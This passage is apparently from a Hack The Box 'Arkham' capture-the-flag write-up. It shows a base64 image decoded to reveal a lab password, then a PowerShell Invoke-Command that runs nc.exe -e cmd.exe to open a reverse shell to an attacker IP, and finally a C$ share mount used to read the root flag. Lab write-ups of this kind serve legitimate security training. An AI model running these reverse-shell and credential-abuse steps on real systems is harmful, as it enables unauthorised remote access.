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
AQIE5hP4/wjr8uh7Wbf/AAAAAElFTkSuQmCC


----boundary-LibPST-iamunique-672158152_-_---
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-see-two-interesting-things-here-first-one-is-this-message--master-wayne-stop-forgetting-your-password-and-second-one-is-the-base-64-encoded-image-i-decoded-it-and-saved-it-&quot;&gt;We can see two interesting things here, first one is this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne stop forgetting your password&lt;/code&gt; and second one is the base-64 encoded image. I decoded it and saved it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nano image001.png.b64
root@kali:~/Desktop/HTB/boxes/arkham/backups# base64 -d image001.png.b64 &amp;gt; image001.png
root@kali:~/Desktop/HTB/boxes/arkham/backups# file image001.png
image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
root@kali:~/Desktop/HTB/boxes/arkham/backups# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;image001png-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;image001.png&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-have-the-password-for-batman-by-checking-the-local-group-memberships-of-batman-we-can-see-that-batman-is-in-the-administrators-group-and-also-in-the-remote-management-users-group-&quot;&gt;Great, we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt;. By checking the local group memberships of &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, and also in the Remote management users group :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net user batman
net user batman
User name                    Batman
Full Name
Comment
User's comment
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 9:25:51 AM
Password expires             Never
Password changeable          2/3/2019 9:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/10/2019 1:29:47 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.


C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-we-can-use-powershells-invoke-command-with-the-credentials-we-have-to-get-a-reverse-shell--&quot;&gt;So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; with the credentials we have to get a reverse shell  :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\&amp;gt; $username = 'batman'
$username = 'batman'
PS C:\&amp;gt; $password = 'Zx^#QZX+T!123'
$password = 'Zx^#QZX+T!123'
PS C:\&amp;gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\&amp;gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\&amp;gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }                                      
Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;batman-is-in-the-administrators-group-however-i-couldnt-read-the-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, however I couldn’t read the flag :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Batman\Documents&amp;gt;cd ../../Administrator/Desktop
cd ../../Administrator/Desktop
Access is denied.

C:\Users\Batman\Documents&amp;gt;type C:\Users\Administrator\Desktop\root.txt 
type C:\Users\Administrator\Desktop\root.txt
Access is denied.

C:\Users\Batman\Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;that-was-weird-after-trying-a-lot-of-things-i-wanted-to-see-if-anything-will-change-if-i-mounted-c-then-accessed-it&quot;&gt;That was weird, after trying a lot of things I wanted to see If anything will change if I mounted &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then accessed it.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net use Z: \\ARKHAM\C$
net use Z: \\ARKHAM\C$
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-yes-that-worked-&quot;&gt;And yes that worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
